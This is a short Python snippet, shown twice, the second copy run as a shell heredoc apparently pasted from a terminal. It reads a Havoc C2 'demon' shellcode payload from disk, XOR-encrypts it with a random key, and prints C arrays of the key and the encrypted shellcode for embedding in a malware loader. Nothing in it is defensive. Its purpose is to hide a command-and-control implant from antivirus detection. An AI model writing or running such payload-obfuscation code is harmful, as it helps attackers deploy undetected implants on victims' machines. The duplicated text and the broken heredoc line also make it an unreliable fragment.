import os
key = os.urandom(16)
shellcode = open("/home/havoc/payloads/demon.x64.bin", "rb").read()
encrypted = bytes([b ^ key[i % 16] for i, b in enumerate(shellcode)])
print("unsigned char xor_key[] = {" + ", ".join(f"0x{b:02x}" for b in key) + "};")
print("unsigned char shellcode[] = {" + ", ".join(f"0x{b:02x}" for b in encrypted) + "};")
EOFpython3 - << 'EOF'
import os
key = os.urandom(16)
shellcode = open("/home/havoc/payloads/demon.x64.bin", "rb").read()
encrypted = bytes([b ^ key[i % 16] for i, b in enumerate(shellcode)])
print("unsigned char xor_key[] = {" + ", ".join(f"0x{b:02x}" for b in key) + "};")
print("unsigned char shellcode[] = {" + ", ".join(f"0x{b:02x}" for b in encrypted) + "};")
